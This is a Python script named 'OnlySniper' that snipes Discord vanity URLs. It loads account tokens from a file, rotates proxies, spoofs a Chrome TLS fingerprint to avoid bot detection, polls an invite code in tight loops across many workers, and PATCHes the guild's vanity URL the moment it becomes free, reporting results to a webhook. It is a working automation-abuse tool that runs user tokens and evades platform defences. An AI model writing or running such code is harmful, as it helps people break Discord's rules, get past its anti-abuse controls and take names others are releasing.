import asyncio
import random
import json
import os
import sys
from datetime import datetime
from typing import List, Optional
from curl_cffi.requests import AsyncSession

# --- PROFESSIONAL LOGGING ---
class Logger:
    @staticmethod
    def _timestamp():
        return datetime.now().strftime("%H:%M:%S")

    @staticmethod
    def info(msg):
        print(f"[\033[94m{Logger._timestamp()}\033[0m] [\033[92mINFO\033[0m] {msg}")

    @staticmethod
    def warn(msg):
        print(f"[\033[94m{Logger._timestamp()}\033[0m] [\033[93mWARN\033[0m] {msg}")

    @staticmethod
    def error(msg):
        print(f"[\033[94m{Logger._timestamp()}\033[0m] [\033[91mERROR\033[0m] {msg}")

    @staticmethod
    def success(msg):
        print(f"[\033[94m{Logger._timestamp()}\033[0m] [\033[92mSUCCESS\033[0m] \033[1m{msg}\033[0m")

    @staticmethod
    def attack(msg):
        print(f"[\033[94m{Logger._timestamp()}\033[0m] [\033[95mATTACK\033[0m] \033[1;5;91m{msg}\033[0m")

class OnlySniper:
    def __init__(self):
        self.config = self._load_json("config.json")
        self.raw_tokens = self._load_list("tokens.txt")
        self.proxies = self._load_list("proxies.txt")
        
        if not self.raw_tokens:
            Logger.error("No tokens found in tokens.txt!")
            sys.exit(1)

        self.guild_id = self.config.get("guild_id")
        self.target_url = self.config.get("target_url")
        self.webhook_url = self.config.get("webhook_url")
        self.threads = self.config.get("threads", 10)
        self.interval = self.config.get("check_interval", 0.05) # Faster default
        
        self.found = False
        self.valid_tokens = []
        self.headers_list = []

    def _load_json(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            Logger.error(f"Failed to load {path}: {e}")
            sys.exit(1)

    def _load_list(self, path):
        if not os.path.exists(path):
            return []
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]

    async def validate_tokens(self):
        """Checks which tokens are valid and have access."""
        Logger.info("Validating tokens...")
        async with AsyncSession(impersonate="chrome110") as session:
            for token in self.raw_tokens:
                try:
                    resp = await session.get(
                        "https://discord.com/api/v10/users/@me",
                        headers={"Authorization": token}
                    )
                    if resp.status_code == 200:
                        user_data = resp.json()
                        Logger.success(f"Token Valid: {user_data['username']}#{user_data['discriminator']}")
                        self.valid_tokens.append(token)
                        self.headers_list.append({
                            "Authorization": token,
                            "Content-Type": "application/json",
                        })
                    else:
                        Logger.warn(f"Invalid Token found and skipped: {token[:20]}...")
                except Exception as e:
                    Logger.error(f"Error validating token: {e}")

        if not self.valid_tokens:
            Logger.error("No valid tokens found! Exiting...")
            sys.exit(1)
        Logger.info(f"Total Valid Tokens: {len(self.valid_tokens)}")

    async def send_webhook(self, content):
        if not self.webhook_url:
            return
        async with AsyncSession() as session:
            try:
                await session.post(self.webhook_url, json={"content": content})
            except:
                pass

    async def claim(self, session: AsyncSession, header: dict):
        """Attempts to claim the vanity URL using advanced fingerprinting."""
        url = f"https://discord.com/api/v10/guilds/{self.guild_id}/vanity-url"
        payload = {"code": self.target_url}
        
        try:
            # Use the session which already has the TLS fingerprint
            resp = await session.patch(url, headers=header, json=payload)
            if resp.status_code in [200, 204]:
                Logger.success(f"URL CLAIMED: discord.gg/{self.target_url}")
                await self.send_webhook(f"✅ **URL ALINDI!**\nURL: discord.gg/{self.target_url}\nSunucu ID: {self.guild_id}")
                self.found = True
                return True
            else:
                Logger.error(f"Claim failed! Status: {resp.status_code} | Body: {resp.text}")
                await self.send_webhook(f"❌ **Claim Başarısız!**\nDurum Kodu: {resp.status_code}")
        except Exception as e:
            Logger.error(f"Claim Exception: {e}")
        return False

    async def worker(self, worker_id: int):
        """Worker loop with TLS Fingerprinting (impersonating Chrome)."""
        proxy = random.choice(self.proxies) if self.proxies and self.config.get("use_proxies") else None
        
        # impersonate="chrome110" provides the TLS fingerprinting the user asked for
        async with AsyncSession(
            proxies={"http": proxy, "https": proxy} if proxy else None,
            impersonate="chrome110",
            timeout=2.0
        ) as session:
            
            check_url = f"https://discord.com/api/v10/invites/{self.target_url}"
            Logger.info(f"Worker-{worker_id} started with TLS Fingerprint.")

            while not self.found:
                try:
                    header = random.choice(self.headers_list)
                    # Discord checks the invite status
                    response = await session.get(check_url, headers=header)

                    if response.status_code == 404:
                        Logger.attack(f"Worker-{worker_id}: URL IS FREE! ATTACKING...")
                        await self.claim(session, header)
                        break
                    
                    elif response.status_code == 429:
                        retry_after = response.json().get('retry_after', 1)
                        Logger.warn(f"Worker-{worker_id}: Rate Limited. Sleeping {retry_after}s")
                        await asyncio.sleep(retry_after)
                        continue

                    await asyncio.sleep(self.interval)
                    
                except Exception as e:
                    # Silent retry for network errors to keep speed
                    await asyncio.sleep(0.1)

    async def run(self):
        print("\033[95m" + r"""
  ____        _       _____       _                 
 / __ \      | |     / ____|     (_)                
| |  | |_ __ | |_   | (___  _ __  _ _ __   ___ _ __ 
| |  | | '_ \| | | | \___ \| '_ \| | '_ \ / _ \ '__|
| |__| | | | | | |_| |____) | | | | | |_) |  __/ |   
 \____/|_| |_|_|\__, |_____/|_| |_|_| .__/ \___|_|   
                 __/ |              | |              
                |___/               |_|              
        """ + "\033[0m")
        
        await self.validate_tokens()
        
        Logger.info(f"Target: discord.gg/{self.target_url}")
        Logger.info(f"Threads: {self.threads} | Valid Tokens: {len(self.valid_tokens)}")
        
        tasks = [self.worker(i) for i in range(self.threads)]
        await asyncio.gather(*tasks)

async def main():
    sniper = OnlySniper()
    await sniper.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        Logger.info("Sniper stopped by user.")
    except Exception as e:
        Logger.error(f"Fatal Error: {e}")